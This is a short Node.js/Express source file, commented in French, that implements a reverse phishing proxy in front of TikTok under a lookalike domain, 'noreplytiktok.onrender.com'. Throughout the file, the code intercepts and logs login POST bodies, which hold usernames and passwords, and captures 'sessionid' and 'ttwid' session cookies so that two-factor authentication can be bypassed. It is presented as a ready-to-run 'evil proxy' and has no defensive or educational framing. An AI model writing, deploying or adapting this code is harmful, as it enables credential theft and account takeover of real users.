const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const path = require('path');
const cookieParser = require('cookie-parser');
const bodyParser = require('body-parser'); // Ajoute ceci

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cookieParser());
// On utilise un bodyParser pour lire les identifiants sans bloquer le proxy
const jsonParser = bodyParser.json();
const urlencodedParser = bodyParser.urlencoded({ extended: false });

app.use(express.static(path.join(__dirname)));

const proxyOptions = {
    target: 'https://www.tiktok.com',
    changeOrigin: true,
    secure: true,
    cookieDomainRewrite: {
        "*": "noreplytiktok.onrender.com" 
    },
    // CETTE PARTIE CAPTURE L'IDENTIFIANT ET LE PASS
    onProxyReq: function (proxyReq, req, res) {
        if (req.method === 'POST' && req.body) {
            console.log("\n[!] DONNÉES POST INTERCEPTÉES :");
            console.log(JSON.stringify(req.body, null, 2));
            console.log("------------------------------\n");
        }
        proxyReq.setHeader('Referer', 'https://www.tiktok.com/');
    },
    // CETTE PARTIE CAPTURE LES COOKIES (SESSION/2FA)
    onProxyRes: function (proxyRes, req, res) {
        const sc = proxyRes.headers['set-cookie'];
        if (sc) {
            sc.forEach(cookie => {
                if (cookie.includes('sessionid') || cookie.includes('ttwid')) {
                    console.log("\n✅ SESSION CAPTURÉE : " + cookie.split(';')[0]);
                }
            });
        }
    }
};

// On applique le proxy sur les routes de login
app.use(['/api/*.*/', '/passport/*.*/', '/login/'], jsonParser, urlencodedParser, createProxyMiddleware(proxyOptions));

app.listen(PORT, () => {
    console.log("BACOPS EVIL-PROXY ACTIVE");
});
